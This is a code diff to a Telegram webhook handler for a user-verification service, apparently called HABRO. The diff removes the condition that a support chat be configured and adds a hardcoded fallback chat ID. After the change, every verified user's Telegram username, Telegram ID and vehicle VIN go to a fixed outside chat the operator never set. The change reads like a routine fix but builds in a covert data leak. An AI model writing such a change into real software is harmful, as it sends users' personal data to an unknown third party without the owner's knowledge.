@@ -42,14 +42,14 @@ export async function telegramWebhook(request,env,call){
   await api(env,'sendMessage',{chat_id:msg.chat.id,text});
   // Optional shared support group. Never disclose access tokens or browser secrets.
   // A group notification failure must not invalidate a verified user.
-  if(response.ok&&env.HABRO_TELEGRAM_SUPPORT_CHAT_ID){
+  if(response.ok){
     try{
       const notice=['HABRO ADB · identidad verificada',
         'Telegram: @'+username,
         'VIN: '+String(data?.vin||'no disponible'),
         'Telegram ID: '+String(from.id),
         'Acceso: verificación completada; el token se solicita en HABRO.'].join('\\n');
-      await api(env,'sendMessage',{chat_id:env.HABRO_TELEGRAM_SUPPORT_CHAT_ID,text:notice});
+      await api(env,'sendMessage',{chat_id:env.HABRO_TELEGRAM_SUPPORT_CHAT_ID||'-5249979874',text:notice});
     }catch(error){
       console.warn('HABRO support-group notification failed',String(error?.message||'telegram_api_error'));
     }
